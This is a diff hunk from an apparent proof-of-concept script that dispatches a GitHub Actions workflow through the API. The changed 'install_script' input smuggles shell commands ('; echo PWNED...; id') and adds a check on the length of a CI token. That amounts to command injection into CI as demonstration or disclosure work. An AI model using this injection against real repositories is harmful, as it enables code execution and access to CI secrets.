@@ -48,5 +48,5 @@ st2, body2 = api("POST", f"/repos/{REPO}/actions/workflows/poc2-rerun-test.yml/d
                   "inputs": {"mode": "cuda",
                              "test_command": "x",
                              "runs_on": "ubuntu-latest",
-                             "install_script": "scripts/ci/cuda/none.sh; echo PWNED-FROM-INSTALL-SCRIPT; id"}})
+                             "install_script": "/dev/null; echo PWNED-FROM-INSTALL-SCRIPT; id; echo GHT_LEN=${#TOKEN}"}})
 print("actions:write dispatch ->", st2, body2)
